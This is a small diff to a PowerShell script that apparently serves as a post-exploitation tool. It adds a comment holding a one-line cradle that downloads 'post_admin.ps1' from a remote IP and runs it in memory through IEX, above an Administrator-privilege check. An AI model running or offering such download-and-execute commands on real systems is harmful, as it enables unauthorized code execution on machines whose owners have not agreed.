@@ -1,3 +1,4 @@
+# powershell -c "(new-object system.net.webclient).downloadstring('http://192.168.45.203/post_admin.ps1') | IEX"
 # Ensure the script is run as Administrator
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {
